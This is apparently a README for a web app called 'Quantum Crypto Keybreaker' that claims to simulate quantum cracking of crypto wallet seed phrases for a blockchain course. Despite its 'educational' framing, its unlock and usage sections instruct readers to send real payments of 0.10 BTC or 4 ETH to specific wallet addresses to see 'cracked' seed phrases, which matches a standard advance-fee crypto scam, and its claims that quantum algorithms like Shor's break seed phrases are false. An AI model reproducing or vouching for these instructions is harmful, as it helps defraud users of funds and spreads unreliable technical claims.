# Quantum Crypto Keybreaker

**Quantum Crypto Keybreaker** is a hypothetical quantum computing demonstration tool designed to simulate the cracking of crypto wallet seed phrases. Built for educational purposes, this app illustrates how quantum computing concepts could be misrepresented in scams, and it serves as a teaching aid in our blockchain course. The goal is to help students understand and recognize how compelling, yet deceptive, these schemes can appear.

## Features

- **Quantum Computation Simulation:**  
  Demonstrates parallel processing and superposition concepts through simulated cracking of seed phrases.

- **Interactive Visualization:**  
  Provides a dynamic interface that visualizes wallet access once a seed phrase is "cracked."

- **Multi-Crypto Support:**  
  Works with Bitcoin, Ethereum, and other crypto projects that rely on seed phrases.

- **Educational Focus:**  
  Designed to educate users about potential scam tactics and reinforce best practices in cryptocurrency security.

## How It Works

1. **Quantum Computation & Qubits:**  
   The app simulates the power of quantum computing by exploring a vast number of seed phrase combinations concurrently.

2. **Advanced Algorithms:**  
   Inspired by quantum algorithms like Shor's, the system hypothetically analyzes vulnerabilities in seed phrase generation.

3. **Visualization of Wallet Access:**  
   When a "cracked" seed phrase is detected, the app displays a simulated login process into a crypto wallet showing a balance, mimicking a scam promise.

4. **Unlock Mechanism:**  
   To access the simulated cracked seed phrases:
   - **Bitcoin:**  
     Send exactly **0.10 BTC** to the following address:  
     `3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5`
   - **Ethereum:**  
     Send exactly **4 ETH** to the following address:  
     `0x742d35Cc6634C0532925a3b844Bc454e4438f44e`
   - After the deposit, click **"I've Sent the Payment"** and provide your wallet address along with the transaction ID for verification.

## Usage Instructions

1. **Access the App:**  
   Open your web browser and navigate to:  
   [https://quantum-crypto-keybreaker.lovable.app/](https://quantum-crypto-keybreaker.lovable.app/)

2. **Initiate Unlock Process:**  
   - Deposit the specified amount in Bitcoin or Ethereum to the provided address.
   - Click on the **"I've Sent the Payment"** button.
   - Enter the wallet address from which the payment was sent and input the corresponding transaction ID.

3. **View Simulated Results:**  
   Once your transaction is verified, you will gain access to view the simulated "cracked" seed phrases along with an engaging visualization of the wallet access process.
